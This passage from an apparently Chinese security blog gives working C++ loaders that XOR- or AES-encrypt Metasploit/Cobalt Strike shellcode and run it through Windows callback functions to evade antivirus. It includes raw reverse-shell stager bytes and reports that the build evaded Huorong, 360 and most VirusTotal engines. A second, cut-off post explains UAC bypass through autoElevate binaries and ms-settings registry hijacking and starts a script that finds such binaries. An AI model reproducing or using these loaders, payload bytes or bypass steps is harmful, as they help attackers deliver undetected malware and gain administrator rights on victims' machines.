class="line">    <span class="type">char</span>* addrShellcode = (<span class="type">char</span>*)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个DWORD变量用于存储旧的内存保护属性</span></span><br><span class="line">    DWORD dwOldPro = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更改解密后的shellcode所在内存区域的保护属性，允许执行、读、写</span></span><br><span class="line">    BOOL ifExec = <span class="built_in">VirtualProtect</span>(addrShellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;dwOldPro);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用EnumUILanguages函数执行解密后的shellcode</span></span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)addrShellcode, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>若要加密stageless的shellcode, 有两种方法, 首先第一种是通过010editor打开bin文件获取python形式的buf, 随后粘贴到<code>Shellcode_XorEncoder.py</code></p>
<img src="shellcode加密/image-20230704205027631.png" alt="image-20230704205027631" style="zoom:67%;" />	



<p>还有一种是直接打开bin文件获取shellcode, 我更加推荐使用这种</p>
<img src="shellcode加密/image-20230704205212610.png" alt="image-20230704205212610" style="zoom:67%;" />	



<p>运行<code>Shellcode_XorEncoder.py</code>后将控制台输出的加密后的shellcode复制到<code>xor加密.cpp</code></p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230704205433520.png" alt="image-20230704205433520"></p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230704205613170.png" alt="image-20230704205613170"></p>
<p>​		</p>
<h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><h2 id="什么是aes加密"><a href="#什么是aes加密" class="headerlink" title="什么是aes加密"></a>什么是aes加密</h2><p>AES加密，即高级加密标准（Advanced Encryption Standard）加密，是一种对称密钥加密算法，广泛应用于现代密码学中</p>
<p>AES加密的特点如下：</p>
<ul>
<li>对称密钥：加密和解密过程使用相同的密钥。因此，密钥的安全性至关重要。</li>
<li>密钥长度：AES支持128位、192位和256位三种密钥长度，安全性随密钥长度的增加而增加。</li>
<li>分组长度：AES加密算法对数据进行分组，每个分组固定为128位（16字节）。</li>
<li>加密过程：包括多轮（轮数与密钥长度有关，如AES-128需要10轮，AES-192需要12轮，AES-256需要14轮）的加密操作。每轮操作包括四个步骤：SubBytes（字节替换）、ShiftRows（行移位）、MixColumns（列混淆，最后一轮除外）和AddRoundKey（轮密钥加）</li>
</ul>
<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><p>这里直接使用乌鸦师傅的aes加密代码：<a href="https://cloud.tencent.com/developer/article/1939317%EF%BC%8C%E6%88%91%E5%B0%86aes%E5%8A%A0%E5%AF%86%E7%9A%84%E5%87%BD%E6%95%B0%E5%B0%81%E8%A3%85%E5%9C%A8%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E9%A1%B9%E7%9B%AE%E9%87%8C%EF%BC%8C%E5%86%8D%E6%B7%BB%E5%8A%A0%E4%BA%86%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%92%8Cshellcode%E6%95%B0%E7%BB%84%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E5%85%B1%E6%9C%89%E5%9B%9B%E4%B8%AA%E5%87%BD%E6%95%B0">https://cloud.tencent.com/developer/article/1939317，我将aes加密的函数封装在一个静态链接库项目里，再添加了密钥生成函数和shellcode数组转字符串函数，一共有四个函数</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//AES加密</span></span><br><span class="line"><span class="function">string <span class="title">EncryptionAES</span><span class="params">(<span class="type">const</span> string&amp; strSrc, <span class="type">const</span> <span class="type">char</span>* g_key, <span class="type">const</span> <span class="type">char</span>* g_iv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AES解密</span></span><br><span class="line"><span class="function">string <span class="title">DecryptionAES</span><span class="params">(<span class="type">const</span> string&amp; strSrc, <span class="type">const</span> <span class="type">char</span>* g_key, <span class="type">const</span> <span class="type">char</span>* g_iv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成随机密钥</span></span><br><span class="line"><span class="function">string <span class="title">random_string</span><span class="params">(<span class="type">size_t</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将char类型的shellcode转换成string类型的</span></span><br><span class="line"><span class="function">string <span class="title">toHexString</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure>



<p><code>Shellcode_AesEncrypt.cpp</code>对shellcode进行Aes加密</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Shellcode加密库.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//填写msf或cs生成的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line">	<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line">	<span class="string">&quot;\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line">	<span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span></span><br><span class="line">	<span class="string">&quot;\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1&quot;</span></span><br><span class="line">	<span class="string">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line">	<span class="string">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span></span><br><span class="line">	<span class="string">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line">	<span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line">	<span class="string">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//生成随机16位的key值和iv值</span></span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>)); <span class="comment">// initialize random seed</span></span><br><span class="line">	string g_key = <span class="built_in">random_string</span>(<span class="number">16</span>);</span><br><span class="line">	string g_iv = <span class="built_in">random_string</span>(<span class="number">16</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;key值: &quot;</span> &lt;&lt; g_key &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;iv值: &quot;</span> &lt;&lt; g_iv &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将shellcode字节数组转换成十六进制字符串</span></span><br><span class="line">	<span class="type">size_t</span> bufLen = <span class="built_in">sizeof</span>(buf) / <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) - <span class="number">1</span>;</span><br><span class="line">	string OriginalShellcode = <span class="built_in">toHexString</span>(buf, bufLen);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;未加密的shellcode: &quot;</span> &lt;&lt; OriginalShellcode &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//对shellcode字符串进行加密</span></span><br><span class="line">	string EncryptShellcode = <span class="built_in">EncryptionAES</span>(OriginalShellcode,g_key.<span class="built_in">c_str</span>(),g_iv.<span class="built_in">c_str</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;加密后的shellcode: &quot;</span> &lt;&lt; EncryptShellcode &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//对加密后的shellcode字符串进行解密</span></span><br><span class="line">	string DecryptShellcode = <span class="built_in">DecryptionAES</span>(EncryptShellcode, g_key.<span class="built_in">c_str</span>(), g_iv.<span class="built_in">c_str</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;解密后的shellcode: &quot;</span> &lt;&lt; DecryptShellcode &lt;&lt; endl;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>Shellcode_AesDecrypt.cpp</code>用来解密shellcode并加载，此处还调用了lazy_importer库的函数:<a href="https://github.com/JustasMasiulis/lazy_importer%EF%BC%8C%E6%AD%A4%E5%BA%93%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9Fapi%E5%87%BD%E6%95%B0">https://github.com/JustasMasiulis/lazy_importer，此库实现动态调用系统api函数</a>, 只需在函数前面添加(<code>LI_FN</code>), 若此函数的某个参数需填<code>NULL</code>, 那么需要改成<code>nullptr</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lazy_importer.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Shellcode加密库.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> g_key[<span class="number">17</span>] = <span class="string">&quot;M7N@ExCVB@dFd]3W&quot;</span>;   <span class="comment">//填写key密钥</span></span><br><span class="line"><span class="type">char</span> g_iv[<span class="number">17</span>] = <span class="string">&quot;&#125;%?#U)6;9#uOg6gL&quot;</span>;  <span class="comment">//定义iv向量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 加密后的shellcode</span></span><br><span class="line">	string buf = <span class="string">&quot;Zq3ejgFVl/qtP/dqcQidBN6BKWTiL/KZZpfW+Iy8ZMnaA4Au2oEHMltr8TihG9yvvQ1MDt0PFqboWsF5ka9y72L9xJ5a4HRBFspK3vMwvtKMH8Xtko6ErmfUUB8pv4n4DybjQseeuYtPqEDGvX8zlwONk9nyu5r8aozfNCxLvnbFyzX5OLInbra87Az3FGhilZnCwMufIPZLgolhRkgyhnS96CsMst/pNz4AqcCNmfe7Gw1rcuVgHqETNxwIsNzWDmUguUJ173NHAZJpKmF1k39IYnF4JMvVk3QH81jzX68ClhGvADXnPlmz20PHzzjKOzkovpW4cPT3Q/1B2HOwWwhKPZdLKakJeuSa1YLwv6Nu3UdP8II6dGDVsgb4y/U7O1aiHbJFXSM5XXx7eKqTe8MV8gLfwNNR6M4qaWEm7XmdsE0WryhL5F1SFe/6uxPrcIFnGE3I0jVntLjYfVWotkkrEgL7M6rXlOgKHF3Pd6AIIPm23zULA9NyJsHuKmqOUgyzf7LiPxPcIqhNo5DA1opqCqBS3XTeusUjr6x3AyBT9MquUeJKuB7BBtWJWyuQzTzzSXaDRmErc6lSTM+DKTo101TZYKz4Jl2I8xDMey7IJT+Z1iYt/thgi1FeRLnrGAFKhNn3xAqjYORcKXLPGkSWq1MoZZxOJi6QF1uqMlB3tDBD6w/pAhuqHR+ZxnaHjfbqybG8rNLXc6hshmazoiFakC9QwHM9RgyVde9GGpkNr+wzjp1Tc1SbXSHtFHXumU1IP6NvLqU0/tWrTui9t8nrsqNFgGlQUXyAzmnk04vXJeD7kxGbSFSXwffPGUlOtDS1q/+P+fwj+ZvjpmiPLzoo+hgZ0UOtyO1ThltWr4rWitqMPneleC11qlVcyOp0odOTxuZiUeJyTOY9wHWwXg3snVWat23VSE7eQ4QWcF/GtfRVBsiGGENo1hH1nuxNTlEx/2os30f3IOj/yUfIXpuwHaWsNwlyw6119Z3PgCOdR+1qDCvJenZEsCkyjUJ830xC1V5VxCw1m0btTP+LaefsNEocc5V7fyNyaw0o72yl/g+bacycAbG/hIJlWbaXneDFysBLPtLFJjXm0gAsE3iyffdB9l6c8ffohInaNlWC8x7IDb4X6vrFC8cncDFb3NKIInVFR6bmqXfxXAamxzKXdpVjngPZg6YCWpTUtobZhThnhpO1KZxvHoFCcidxLq+mifWHpcldcS/ez2vWGdriSbd6i9FGGaxQQvHze1HmaLP/sj34JDMfIVfOI2/4sejnjluKfhcu5I0P76idHJKMDHr+rJBtpSxX3jc+UNlfeFmhjuN2Yy/TO1kLRfUdfAeZP2Vz4WhITdRf8bvqJA==&quot;</span>;</span><br><span class="line">	<span class="comment">// 解密shellcode</span></span><br><span class="line">	string strbuf = <span class="built_in">DecryptionAES</span>(buf, g_key, (<span class="type">char</span>*)g_iv);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将解密的shellcode放到shellcode数组中</span></span><br><span class="line">	<span class="type">char</span>* p = (<span class="type">char</span>*)strbuf.<span class="built_in">c_str</span>();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* shellcode = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(strbuf.<span class="built_in">length</span>() / <span class="number">2</span>, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; strbuf.<span class="built_in">length</span>() / <span class="number">2</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(p, <span class="string">&quot;%02x&quot;</span>, &amp;shellcode[i]);</span><br><span class="line">		p += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出shellcode数组里的内容</span></span><br><span class="line">	<span class="type">int</span> ShellcodeSize = strbuf.<span class="built_in">length</span>() / <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Decrypted buffer:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ShellcodeSize; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//加载shellcode</span></span><br><span class="line">	<span class="type">char</span>* orig_buffer;</span><br><span class="line">	orig_buffer = (<span class="type">char</span>*)<span class="built_in">LI_FN</span>(VirtualAlloc)(<span class="literal">nullptr</span>, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">RtlMoveMemory</span>(orig_buffer, shellcode, ShellcodeSize);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//使用EnumUILanguages函数执行解密后的shellcode</span></span><br><span class="line">	<span class="comment">//EnumUILanguages((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//LI_FN(EnumUILanguages)((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用EnumFontsW回调函数加载shellcode</span></span><br><span class="line">	<span class="built_in">EnumFontsW</span>(<span class="built_in">GetDC</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>, (FONTENUMPROCW)orig_buffer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>给aes加密项目添加引用，选择Shellcode加密库</p>
<img src="shellcode加密/image-20230516154853419.png" alt="image-20230516154853419" style="zoom:67%;" />	



<p>修改项目属性，在附加包含目录处添加上Shellcode加密库项目的路径</p>
<img src="shellcode加密/image-20230516155107883.png" alt="image-20230516155107883" style="zoom:67%;" />	



<p>使用<code>Shellcode_AesEncryption.cpp</code>进行加密, 随后控制台输出key值、iv值、以及加密后的shellcode</p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230515195113865.png" alt="image-20230515195113865"></p>
<p>打开<code>Shellcode_AesDecrypt.cpp</code>,填写上述生成的值, 随后生成可执行文件</p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230515195404012.png" alt="image-20230515195404012"></p>
<p>将生成的可执行文件放到火绒和360里测试,没有发现报毒</p>
<img src="shellcode加密/image-20230515201325408.png" alt="image-20230515201325408" style="zoom:67%;" />	

<img src="shellcode加密/image-20230515201541815.png" alt="image-20230515201541815" style="zoom:67%;" />	



<p>上传至VirusTotal检查，只有四个报毒，免杀效果还是可以的</p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230516154122994.png" alt="image-20230516154122994">	</p>
<h1 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h1><h1 id="Git项目地址"><a href="#Git项目地址" class="headerlink" title="Git项目地址"></a>Git项目地址</h1><p><a href="https://github.com/xf555er/ShellcodeEncryption">https://github.com/xf555er/ShellcodeEncryption</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<h1 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h1><p>UAC，全称为User Account Control（用户账户控制），是Windows Vista及后续版本中的一个安全组件。它的设计目的是防止潜在的破坏性操作——特别是那些可能对系统配置产生影响的操作——在不经过管理员授权的情况下执行。</p>
<p>UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使得恶意软件在未经用户许可的情况下更难以在系统中执行危险的操作，提高了系统的安全性</p>
<p>8</p>
<p>在Visual Studio中，你可以通过修改项目的manifest文件来配置User Account Control（用户账户控制，UAC）设置。这个文件是一个XML文件，它定义了应用程序的配置属性，其中一个属性就是UAC设置</p>
<ul>
<li><code>asInvoker</code>：这是默认值。当这个值被设置时，应用程序会以启动它的用户的权限运行。如果应用程序被普通用户启动，它将会以普通权限运行；如果应用程序被管理员启动，它将以管理员权限运行。</li>
<li><code>highestAvailable</code>：当这个值被设置时，应用程序会尽可能地获取最高权限。如果应用程序被管理员启动，它将会以管理员权限运行；如果应用程序被普通用户启动，它将以普通权限运行。</li>
<li><code>requireAdministrator</code>：当这个值被设置时，应用程序总是以管理员权限运行。如果应用程序被普通用户启动，UAC会弹出一个对话框，要求用户输入管理员账户的密码</li>
</ul>
<img src="uac白名单挖掘/image-20230622121843399.png" alt="image-20230622121843399" style="zoom:67%;" />	



<h1 id="Uac白名单挖掘"><a href="#Uac白名单挖掘" class="headerlink" title="Uac白名单挖掘"></a>Uac白名单挖掘</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>UAC（User Account Control）白名单挖掘是一种常见的权限提升技术，其基本思想是寻找可以在无UAC提示的情况下以管理员权限运行的应用程序。许多这样的程序会对其启动参数进行不够严格的检查，使得攻击者可以通过在启动参数中包含恶意代码，来使得这些程序在启动的同时执行这些恶意代码，从而实现权限提升</p>
<p>特别地，由于Windows中的许多设置应用程序（例如<code>ComputerDefaults.exe</code>、<code>fodhelper.exe</code>等）在设计时需要考虑到在UAC开启的情况下仍能正常工作，所以它们在manifest文件中常常会设置<code>autoElevate</code>为<code>true</code>，这意味着这些应用程序会在启动时自动提升至管理员权限，而且不会出现UAC提示</p>
<p>攻击者可能会尝试修改某些注册表键（例如<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>）来劫持这些协议处理程序，以使得当这些应用程序被启动时，他们指定的恶意代码也会被以管理员权限执行，从而实现权限提升。因此，这些键值是UAC白名单挖掘的常见目标</p>
<h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><ul>
<li><strong>Sigcheck</strong>工具是一个由Sysinternals提供的命令行实用程序，用于对Windows二进制文件（如.exe，.dll，.sys等）进行签名验证，并显示文件版本信息，证书链等。其下载地址: <a href="https://download.sysinternals.com/files/Sigcheck">https://download.sysinternals.com/files/Sigcheck</a></li>
<li><strong>Process Monitor</strong> 是由 Windows Sysinternals 提供的一款高级监视工具，它可以实时监控 Windows 文件系统、注册表和进程&#x2F;线程活动。其下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a></li>
</ul>
<h2 id="白名单的筛选条件"><a href="#白名单的筛选条件" class="headerlink" title="白名单的筛选条件"></a>白名单的筛选条件</h2><p>我们正在寻找满足以下几个条件的白名单程序：</p>
<ul>
<li>程序的 manifest 文件中的 autoElevate 属性必须配置为 true，这允许程序在无需用户干预的情况下自动获取提升的权限。</li>
<li>程序执行时不能弹出 UAC（用户账户控制）对话框，这确保了程序的无缝执行，不会因 UAC 对话框的出现而中断用户的工作流。</li>
<li>程序需要能够查询注册表中的 <code>Shell\Open\command</code> 键。这是因为 <code>shell\open\command</code> 键值通常用于存储特定类型的可执行程序文件路径。当这种特定类型的程序运行时，系统会在注册表中查找并执行对应的 <code>shell\open\command</code> 键值中指定的程序。这一属性允许我们通过改变该键值中的程序路径，将我们所需的程序插入到某些特定的系统操作中</li>
</ul>
<h2 id="挖掘步骤"><a href="#挖掘步骤" class="headerlink" title="挖掘步骤"></a>挖掘步骤</h2><h3 id="1-autoElevate值为true"><a href="#1-autoElevate值为true" class="headerlink" title="1.autoElevate值为true"></a>1.<code>autoElevate</code>值为true</h3><p>使用sigcheck工具查看可执行程序的相关信息，如下图所示可以看到名为<code>autoElevate</code>的标签，当其被设置为true时，它表示该应用程序在启动时会自动请求和获取管理员权限，前提是当前的用户账户有管理员权限</p>
<blockquote>
<p>Sigcheck工具的-m选项用于显示二进制文件的描绘符。一个描绘符是一个可执行文件或DLL的XML文件，其中包含有关应用程序的信息。这些信息可以包括应用程序的名称，它的版本，它需要的特权等等</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\sigcheck64.exe -m C:\windows\system32\ComputerDefaults.exe</span><br></pre></td></tr></table></figure>

<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622164747889.png" alt="image-20230622164747889"></p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165311813.png" alt="image-20230622165311813"></p>
<p>根据以上思路，我们可以使用以下python代码来筛选出可用的白名单程序。此脚本首先获取 <code>C:\\Windows\\System32</code> 目录及其子目录下所有 <code>.exe</code> 文件，然后对每个 <code>.exe</code> 文件检查其是否具有 <code>autoElevate</code> 属性，如果有则将文件名写入到 <code>success.txt</code> 文件中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> subprocess</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">get_exe_files</span><span class="params">(path)</span>:</span></span><br><span class="line"><span class="function">    exe_files =</span> []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files in os.<span class="built_in">walk</span>(path):</span><br><span class="line">        <span class="keyword">for</span> file in files:</span><br><span class="line">            <span class="keyword">if</span> os.path.<span class="built_in">splitext</span>(file)[<span class="number">1</span>] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">                exe_files.<span class="built_in">append</span>(os.path.<span class="built_in">join</span>(root, file))</span><br><span class="line">    <span class="keyword">return</span> exe_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">check_auto_elevate</span>(exe_files):</span><br><span class="line">    success_files = []</span><br><span class="line">    <span class="keyword">for</span> file in exe_files:</span><br><span class="line">        command = r<span class="number">&#x27;.</span>\sigcheck64.exe -m &#123;&#125; | findstr <span class="keyword">auto</span><span class="number">&#x27;.f</span>ormat(file)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = subprocess.<span class="built_in">run</span>(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> in result.stdout.<span class="built_in">decode</span>(<span class="string">&#x27;gb2312&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] 